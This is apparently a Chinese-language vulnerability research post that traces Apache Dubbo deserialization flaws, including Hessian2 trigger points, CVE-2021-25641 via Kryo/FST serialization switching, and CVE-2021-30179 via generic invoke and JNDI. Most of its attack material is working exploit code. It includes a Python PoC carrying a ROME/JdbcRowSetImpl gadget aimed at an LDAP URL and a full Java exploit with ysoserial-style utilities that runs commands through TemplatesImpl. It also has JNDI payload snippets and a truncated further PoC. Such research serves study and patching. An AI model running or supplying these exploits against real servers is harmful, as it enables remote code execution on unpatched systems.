![image-20250210195408180](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210195408180.png)

至此上面的攻击失效



#### 漏洞触发点1,2翻版

POC:

```python
#pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 20880)

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8085/GQOsPFQU",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )

resp = client.send_request_and_return_response(
service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
method_name='sayHello',
service_version=toStringBean,
args=[new_object('java.lang.Class')])
```



恶意反序列化类从dubbo 协议的service入口传入

依旧是看到DecodeableRpcInvocation#decode方法

![image-20250212185206039](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212185206039.png)

注意到设置path、version、method_name都是通过in.readUTF进行的，此处的in是Hessian2ObjectInput

![image-20250212185327107](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212185327107.png)

跟进到readUTF，调用了Hessian2Input.readString

![image-20250212185719315](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212185719315.png)

理论上来说，这里的version值应该是`"1.0.0"`，应该是个字符串，但是我们传的ToStringBean，所以转向default；在default中是个throw异常

![image-20250212185946094](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212185946094.png)

![image-20250212185909886](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212185909886.png)

重点是Hessian2Input有自己的expect异常函数

![image-20250212190125740](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212190125740.png)

此处同样存在两个触发点：

一个调用到了readObject，通过Hessian2的MapDeserializer触发

![image-20250212190255336](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212190255336.png)

![image-20250212190405790](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212190405790.png)

如上文触发点1，向service_version打个hashMap即可



第二个触发点依旧是报错，字符串拼接触发toString

![image-20250212190520839](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212190520839.png)

由此可知，2.7.0-2.7.13dubbo 通过hashMap打ROME链，在调用到readUTF的地方都适用，也就是包括`path`、`service_version`和`args`参数都可以打

在python DubboClient库DubboRequest分别对应以下参数

![image-20250212190947947](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212190947947.png)

#### 漏洞触发点3

2.7.0<=dubbo<=2.7.8

在这里解释一下前面java payload的如下语句

```java
// header.
byte[] header = new byte[16];
// set magic number.
Bytes.short2bytes((short) 0xdabb, header);
// set request and serialization flag.
header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

// set request id.
Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
```

Dubbo通信的具体数据包规定如下图所示

![image-20250209111658403](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250209111658403.png)

https://cn.dubbo.apache.org/zh/blog/2018/10/05/dubbo-%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/

![image-20250209111719197](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250209111719197.png)

开头的0xdabb用来判断是不是dubbo协议数据包，如果是则调用decodeBody

如果第18位为1，代表当前数据包为心跳事件，会调用decodeHeartbeatData

>心跳事件是一种定期发生的信号或消息，用于确认系统中两个或多个组件之间的连接状态。

![image-20250212191556106](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212191556106.png)

ExchangeCodec.decodeHeartbeatData内调用了hessian2的readObject，造成反序列化漏洞

![image-20250212191920577](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212191920577.png)

注意，本文提及的readObject触发的漏洞均为hessian2ObjectInput流漏洞，在MapDeserializer触发map.put，而不是普通序列化流ObjectInputStream的漏洞

下面这句的结果如图，设置了16位为1代表Request，18位为1代表心跳包，00010代表Hessian2Serialization

```java
header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
```

![image-20250212192608285](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212192608285.png)

针对2.7.8版本对心跳包的攻击，2.7.9在ExchangeCodec.decodeBody使用decodeEventData处理

![image-20250212194249310](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212194249310.png)

判断了待反序列化的数据长度是否超过阈值(50)，超过则抛出IllegalArugumentException

![image-20250212194338642](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212194338642.png)

也就是说dubbo>=2.7.9时只能选用hashMap打hessian2 readObject去触发漏洞

#### 总结

列个表：

| 漏洞点                                                       | 版本（只说2.7.x）         |
| ------------------------------------------------------------ | ------------------------- |
| decodeHeartbeatData 进入hessian2 readObject触发map.put(args、service_name、path(service_name)都可以触发) | <=2.7.13                  |
| RemotingException字符串拼接触发toString                      | <=2.7.8  =2.7.8关键字绕过 |
| 心跳包标志为1提前触发decodeHeartbeatData                     | <=2.7.8                   |





## CVE-2021-25641 Kryo/Fst反序列化

Dubbo Provider默认使用dubbo协议进行RPC通信，而dubbo协议默认使用Hessian2序列化格式进行对象传输，但是针对Hessian2的对象传输可能会有黑白名单的限制

如下分别是设置白名单和黑名单

![image-20250209105802674](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250209105802674.png)

[Hessian2 whitelist by chickenlj · Pull Request #6378 · apache/dubbo · GitHub](https://github.com/apache/dubbo/pull/6378)

针对这种场景，用Hessian2进行攻击显然很麻烦了。但是攻击者可以更改dubbo协议的第三个flag字节来使用Kryo或Fst序列化格式来进行反序列化攻击

* 漏洞范围：

Apache Dubbo 2.7.0 ~ 2.7.8
Apache Dubbo 2.6.0 ~ 2.6.9
Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。

漏洞测试用到fastjson依赖，dubbo低版本自带了fastjson

```xml
<dependency>
    <groupId>org.apache.dubbo</groupId>
    <artifactId>dubbo‐common</artifactId>
    <version>2.7.3</version>
</dependency>
```

Dubbo可以支持很多类型的反序列化协议，以满足不同系统对RPC的需求

由于Dubbo可以支持很多类型的反序列化协议，以满足不同系统对RPC的需求，比如 

* 跨语言的序列化协议：Protostuff,ProtoBuf,Thrift,Avro,MsgPack 

* 针对Java语言的序列化方式:Kryo,FST 

* 基于Json文本形式的反序列化方式：Json、Gson 


Dubbo中对支持的协议做了一个编号，每个序列化协议都有一个对应的编号，以便在获取TCP流量后，根据编号选择相应的反序列化方法。在org.apache.dubbo.common.serialize.Constants中可见每种序列化协议的编号

![image-20250209111152673](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250209111152673.png)

而在Dubbo的RPC通信时，对流量的规定最前方为header，而header中通过指定 SerializationID，确定客户端和服务提供端通信过程使用的序列化协议。



虽然Dubbo provider默认使用hessian2协议，但是我们可以手动修改数据包Serialization ID，选择危险的反序列化方式，如 8 KryoSerialization / 9 FstSerialization

POC：

https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept/blob/main/DubboProtocolExploit/src/main/java/DubboProtocolExploit/Main.java

```java
import com.alibaba.fastjson.JSONObject;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
import org.apache.dubbo.common.serialize.fst.FstSerialization;
import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
import org.apache.dubbo.common.serialize.kryo.KryoSerialization;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.rpc.RpcInvocation;
import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
import org.apache.dubbo.serialize.hessian.Hessian2Serialization;
/*import com.alibaba.dubbo.common.io.Bytes;
import com.alibaba.dubbo.common.serialize.Serialization;
import com.alibaba.dubbo.common.serialize.fst.FstObjectOutput;
import com.alibaba.dubbo.common.serialize.fst.FstSerialization;
import com.alibaba.dubbo.common.serialize.kryo.KryoObjectOutput;
import com.alibaba.dubbo.common.serialize.kryo.KryoSerialization;
import com.alibaba.dubbo.common.serialize.ObjectOutput;*/

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.net.Socket;

/*  This Dubbo protocol exploit affects versions <= 2.7.3,
    and will print "whoops!" on the server's console via RCE.

    This issue is caused by deserialization of untrusted data,
    triggered via a communication protocol that allows dynamically
    switching to a vulnerable deserializer, and exploited with a
    payload gadget chain based on FastJson

    On Windows servers - it will try to execute calc.exe
    On Linux servers - it will touch /tmp/dubboexploited
 */

public class KryoAndFst {
    // Customize URL for remote targets
    public static String DUBBO_HOST_NAME = "localhost";
    public static int    DUBBO_HOST_PORT = 20880;

    // OS-specific payloads - comment to switch OS variants
    // exploit will print "whoops!" on server console either way
    //public static String DUBBO_RCE_COMMAND = "touch /tmp/dubboexploited"; // Linux
    public static String DUBBO_RCE_COMMAND = "calc.exe"; // Windows

    //Exploit variant - comment to switch exploit variants
    public static String EXPLOIT_VARIANT = "Kryo";
    //public static String EXPLOIT_VARIANT = "FST";

    // Magic header from ExchangeCodec
    protected static final short MAGIC = (short) 0xdabb;
    protected static final byte MAGIC_HIGH = Bytes.short2bytes(MAGIC)[0];
    protected static final byte MAGIC_LOW = Bytes.short2bytes(MAGIC)[1];

    // Message flags from ExchangeCodec
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;

    public static void main(String[] args) throws Exception {
        Object templates = Utils.createTemplatesImpl(DUBBO_RCE_COMMAND);  // TemplatesImpl gadget chain

        // triggers Runtime.exec() on TemplatesImpl.newTransformer()
        JSONObject jo = new JSONObject();
        jo.put("oops",(Serializable)templates); // Vulnerable FastJSON wrapper
        Object gadgetChain = Utils.makeXStringToStringTrigger(jo); // toString() trigger

        // encode request data.
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        // Kryo exploit variant
        Serialization s;
        ObjectOutput objectOutput;
        switch(EXPLOIT_VARIANT) {
            case "FST":
                s = new FstSerialization();
                objectOutput = new FstObjectOutput(bos);
                break;
            case "Kryo":
            default:
                s = new KryoSerialization();
                objectOutput = new KryoObjectOutput(bos);
                break;
        }

        // 0xc2 is Hessian2 + two-way + Request serialization
        // Kryo | two-way | Request is 0xc8 on third byte
        // FST | two-way | Request is 0xc9 on third byte

        byte requestFlags =  (byte) (FLAG_REQUEST | s.getContentTypeId() | FLAG_TWOWAY);
        byte[] header = new byte[]{MAGIC_HIGH, MAGIC_LOW, requestFlags,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // Padding and 0 length LSBs
        bos.write(header);
        // Strings need only satisfy "readUTF" calls until "readObject" is reached, so garbage metadata works too
        /*
        objectOutput.writeUTF("notAversion");
        objectOutput.writeUTF("notAservice");
        objectOutput.writeUTF("notAserviceVersion");
        objectOutput.writeUTF("notAmethod");
        objectOutput.writeUTF("notAtype"); //*/

        // This section contains valid data writes
        RpcInvocation ri = new RpcInvocation();
        ri.setParameterTypes(new Class[] {Object.class, Method.class, Object.class});
        //ri.setParameterTypesDesc("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        ri.setArguments(new Object[] { "sayHello", new String[] {"org.apache.dubbo.demo.DemoService"}, new Object[] {"YOU"}});
        // Strings need only satisfy "readUTF" calls until "readObject" is reached

        // /*
        objectOutput.writeUTF("2.0.2");
        objectOutput.writeUTF("org.apache.dubbo.demo.DemoService");
        objectOutput.writeUTF("0.0.0");
        objectOutput.writeUTF("sayHello");
        objectOutput.writeUTF("Ljava/lang/String;"); //*/

        objectOutput.writeObject(gadgetChain);
        objectOutput.writeObject(ri.getAttachments());

        objectOutput.flushBuffer();
        byte[] payload = bos.toByteArray();
        int len = payload.length - header.length;
        Bytes.int2bytes(len, payload, 12);

        // Dubbo Message Stream Hex Dump
        for (int i = 0; i < payload.length; i++) {
            System.out.print(String.format("%02X", payload[i]) + " ");
            if ((i + 1) % 8 == 0)
                System.out.print(" ");
            if ((i + 1) % 16 == 0 )
                System.out.println();

        }
        // Payload string
        System.out.println();
        System.out.println(new String(payload));

        Socket pingSocket = null;
        OutputStream out = null;
        // Send request over TCP socket
        try {
            pingSocket = new Socket(DUBBO_HOST_NAME, DUBBO_HOST_PORT);
            out = pingSocket.getOutputStream();
        } catch (IOException e) {
            return;
        }
        out.write(payload);
        out.flush();
        out.close();
        pingSocket.close();
        System.out.println("Sent!");
    }
}
```

Utils.java：

```java
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/*
 * Utility class - based on code found in ysoserial, includes method calls used in
 * ysoserial.payloads.util specifically the Reflections, Gadgets, and ClassFiles classes. These were
 * consolidated into a single util class for the sake of brevity; they are otherwise unchanged.
 *
 * Additionally, uses code based on marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger
 * to create a toString trigger
 *
 * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial
 * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec
 */
public class Utils {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Utils.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
       String cmd = "System.out.println(\"whoops!\"); java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Utils.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, Utils.classAsBytes(Utils.Foo.class)
        });

        // required to make TemplatesImpl happy
        Utils.setFieldValue(templates, "_name", "Pwnr");
        Utils.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

    @SuppressWarnings ( {"unchecked"} )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        setAccessible(objCons);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        setAccessible(sc);
        return (T)sc.newInstance(consArgs);
    }

    public static String classAsFile(final Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }

    public static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = Utils.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Utils.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }

    public static Object makeXStringToStringTrigger(Object o) throws Exception {
        XString x = new XString("HEYO");
        return Utils.makeMap(new HotSwappableTargetSource(o), new HotSwappableTargetSource(x));
    }
}
```

payload用dubbo低版本自带的fastjson，如下链：

```java
HashMap.put
HashMap.putVal
HotSwappableTargetSource.equals
XString.equals
JSON.toString
JSON.toJSONString
ASMSerializer_1_TemplatesImpl.write(fastjson动态ASM)触发getter
```

用ROME链也OK，反正套hashMap.put的壳子能触发都可以

```
HashMap.put
HashMap.putVal
HotSwappableTargetSource.equals
XString.equals
ToStringBean.toString
```

还有marshelsec里的其他链子也OK

用其它链子也OK的

依赖，spring依赖自己加一下：

```xml
		<dependency>
            <groupId>org.apache.dubbo</groupId>
            <artifactId>dubbo-common</artifactId>
            <version>2.7.3</version>
        </dependency>
        <dependency>
            <groupId>com.nqzero</groupId>
            <artifactId>permit-reflect</artifactId>
            <version>0.4</version>
        </dependency>
```

### Kryo反序列化

断点同样是打在DubboCodec.decodeBody

调用了CodecSupport.deserialize

![image-20250214134411114](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214134411114.png)

跟进，取到的序列化器为KryoSerialization

![image-20250214134448746](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214134448746.png)

用KryoObjectInput做封装

![image-20250214134535582](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214134535582.png)

回到CodecSupport.deserialize，调用了DecodeableRpcInvocation.decode

![image-20250214134625113](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214134625113.png)

尽管代码一样，也调用了readUTF

![image-20250214135053264](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135053264.png)

但是此处的readUTF input变量不再是hessian2Input，而是普通input类

![image-20250214135137075](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135137075.png)

也就没有自定义的except去拼接字符串，所以这个点不再能触发漏洞

![image-20250214135211063](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135211063.png)

但正是因为不再是hessian2Input，readObject处不再是通过case去用readMap还原hashMap

![image-20250214135512149](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135512149.png)

跟进到KryoObjectInput，调用了readClassAndObject

![image-20250214135621052](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135621052.png)

先获取了Type为HashMap

![image-20250214135925874](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214135925874.png)

然后调用Map反序列化器的read方法

![image-20250214140048283](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214140048283.png)

![image-20250214140155105](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214140155105.png)

跟进read，还原对象后调用HashMap.put

![image-20250214140258671](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214140258671.png)

剩下就是put后链子了，和hessian一样

根据分析，kryo和hessian在还原对象时都不会直接调用其对应的readObject触发漏洞。比如还原hashMap，是在MapSerializer中分别还原对应的key value，然后put进map，而且还原key value都是获取对应的构造函数去还原。因此readObject都不会在这Dubbo中作为漏洞点，Dubbo还是从设计之初就考虑了足够的安全性

Fst反序列化和Kryo、hessian差不多，懒得调了

### 补丁

kryo>=5.0.0后，只有被注册过的类才能被序列化和反序列化，被注册的类只有如下基本类型

![6188e66e-384e-4086-823b-d04919a5be6d](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora6188e66e-384e-4086-823b-d04919a5be6d.png)





## JNDI

### CVE-2021-30179

另外还有一个单独的JNDI点，不用ROME，但是需要已知接口全限定名，方法名，入参，不然无法顺利通过decode，没什么卵用的点，简单看一下抄个payload吧

* 漏洞版本：

  Apache Dubbo 2.7.0 to 2.7.9

  Apache Dubbo 2.6.0 to 2.6.9

来个正常的通信调下流程：

```python
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 20880)

resp = client.send_request_and_return_response(
service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
method_name='$invoke',
service_version='1.0.0',
args=[new_object('java.lang.Class')])
```

将目光转向DecodeHandler#received

![image-20250212204746928](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212204746928.png)

尽管在DecodeableRpcInvocation#decode处过滤了远程调用rpc的name和参数类型，这里我们要传`$invoke`，参数传`Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;`使程序继续运行

![image-20250212205124638](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212205124638.png)

decode结束后调用HeaderExchangeHandler.received处理请求

由于默认发的双向请求，所以进入handleRequest

![image-20250212212431423](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212212431423.png)

handleRequest里调用了reply方法

![image-20250212212637621](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212212637621.png)

跟进发现跳到了DubboProtocol的匿名内部类里面

![image-20250212213125197](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212213125197.png)

reply的后半段，调用了ProtocolFilterWrapper$CallbackRegistrationInvoker的invoke方法

![image-20250212213237570](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212213237570.png)

继续跟进到invoke内，继续跟进invoke，反正跟两三个invoke的样子

![image-20250212213354105](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212213354105.png)

跟到GenericFilter.invoke内，会对传入的 Invocation 对象进行校验：

- 要求方法名等于 $invoke 或 $invoke_async
- 要求参数长度 3 
- 要求invoker 的接口不能继承自 GenericService

校验通过后会通过 getArguments() 方法获取参数。第一个参数为方法名，第二个参数为方法名的类型，第三个参数为args。

然后通过 findMethodByMethodSignature 反射寻找服务端提供的方法（也就是 sayHello 方法），如果没找到将抛出异常。

![image-20250212213624387](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212213624387.png)

五个if，根据generic参数选择不同的反序列化，最后都是反序列化成pojo对象。共有以下类型：

- DefaultGenericSerialization(true)
- JavaGenericSerialization(nativejava)
- BeanGenericSerialization(bean)
- ProtobufGenericSerialization(protobuf-json)
- GenericReturnRawResult(raw.return)

![image-20250212214229378](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212214229378.png)

先看第一个，满足isDefaultGenericSerialization时，也就是generic为true

![image-20250212215749324](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212215749324.png)

会调用PojoUtils.realize

![image-20250212215854573](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212215854573.png)

下面是静态分析

一直跟进到realize0，如果pojo为Map子类这个if里面，获取了class的值，并反射获取

![image-20250212220607912](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212220607912.png)

如果type不是Map或者Object，则实例化type，并反射调用其setter

![image-20250212220936343](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212220936343.png)

向上追溯这几个参数怎么传进去的，name是方法名sayHello，types是sayHello的参数，需要为`new String[] {"java.lang.String"}`，又要满足能通过`$invoke`验证，所以如下：

```java
		out.writeUTF("org.apache.dubbo.spring.boot.demo.consumer.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        // todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});
```

![image-20250212221406661](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250212221406661.png)

第三个参数为args，也就是就是我们传的Object[]

![image-20250214161301066](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214161301066.png)

pojo就来自args，所以args Object[]存hashMap，取class键值和利用就OK了

![image-20250214162645557](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214162645557.png)

class装能用setter的对象，这里搞的org.apache.xbean.propertyeditor.JndiConverter（或者JdbcRowSetImpl都可以），args装方法名asText和参数jndi地址

```java
		HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});
```

那generic呢？来自Attachment参数

![image-20250214163143756](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214163143756.png)

正常来说Attachment如下：

![image-20250214163212300](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250214163212300.png)

java代码里在Dubbo协议尾部加个hashMap，自己会识别

```java
		HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
```

payload如下

```java
    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }
```

还要多加一个org.apache.xbean.propertyeditor.JndiConverter对应的依赖

剩下四个if点都能利用，都差不多。

直接抄RoboTerh poc：

```java
public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
